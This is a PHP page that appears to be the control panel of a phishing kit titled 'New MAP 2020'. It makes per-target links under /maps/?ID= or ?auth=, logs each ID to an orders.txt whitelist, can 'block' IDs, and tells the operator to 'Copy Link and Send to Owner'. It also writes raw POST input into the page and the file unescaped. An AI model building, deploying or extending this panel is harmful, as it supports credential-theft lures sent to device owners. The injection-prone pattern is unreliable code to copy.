<?php

echo "\r\n<!DOCTYPE html>\r\n<html >\r\n<head>\r\n  <meta charset=\"UTF-8\">\r\n  <title>New MAP</title>\r\n  \r\n      <link rel=\"stylesheet\" href=\"style1.css\">\r\n<meta name=\"viewport\" content=\"initial-scale=1, maximum-scale=1\">\r\n  \r\n</head>\r\n\r\n<body>\r\n<br><br>\r\n  <h1>New MAP 2020</h1><br><br>\r\n\r\n\r\n"; 
echo "<center>\r\n";
echo "<div class=\"btn-container\">\r\n\r\n<h2 style=\"color:#fff\" > Random / ID to create Link</h2>\r\n<br><br>\r\n";      
echo " <form action=\"\" method=\"post\">\r\n\t\t\t
<input  type=\"text\" name=\"lin\" style=\"font-size:14pt;height:30px;width:80%;\" />
\r\n\t\t\t
<br><br>
<input type=\"submit\" name=\"submit1\" class=\"btn\" value=\"Random link\" />\r\n\t\t
<br>
<input type=\"submit\" name=\"submit\" class=\"btn\" value=\"Link By ID\" />\r\n\t\t
<br>
<input type=\"submit\" name=\"submit2\" class=\"btn\" value=\"Block\" />\r\n\t\t</form>\r\n\t\t";
if (isset($_POST["submit"])) {
    $lin = empty($_POST["lin"]) ? exit : $_POST["lin"];
    echo "<textarea onclick=\"this.select();\" style=\"font-size:14pt;height:80px;width:300px;\" >https://" . $_SERVER["HTTP_HOST"] . "/maps/?ID=" . $lin . "</textarea>";
    file_put_contents("../../ajax/orders.txt", $lin . "\r\n", FILE_APPEND);
    echo "<br><br><h3><font color=\"#fff\">" . $threadinfo . " Copy Link and Send to Owner</font></h3>";
}
if (isset($_POST["submit1"])) {
    $lin = empty($_POST["lin"]) ? exit : $_POST["lin"];
    echo "<textarea onclick=\"this.select();\" style=\"font-size:14pt;height:80px;width:300px;\" >https://" . $_SERVER["HTTP_HOST"] . "/maps/?auth=" . $lin . "</textarea>";
    file_put_contents("../../ajax/orders.txt", $lin . "\r\n", FILE_APPEND);
    echo "<br><br><h3><font color=\"#fff\">" . $threadinfo . " Copy Link and Send to Owner</font></h3>";
}

if (isset($_POST["submit2"])) {
    $a = $_POST["lin"];
    $filename = "../../ajax/orders.txt";
    $string_to_replace = $a;
    $replace_with = "";
    replace_string_in_file($filename, $string_to_replace, $replace_with);
    echo "<br><h3><font color=\"#fff\">" . $threadinfo . " Link Blocked Successfully</font></h3>";
}
function replace_string_in_file($filename, $string_to_replace, $replace_with)
{
    $content = file_get_contents($filename);
    $content_chunks = explode($string_to_replace, $content);
    $content = implode($replace_with, $content_chunks);
    file_put_contents($filename, $content);
}

echo "\t\t\r\n</div>\r\n";

echo "</center>\r\n";

echo "<script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>\r\n\r\n  \r\n</body>\r\n</html>\r\n";

?>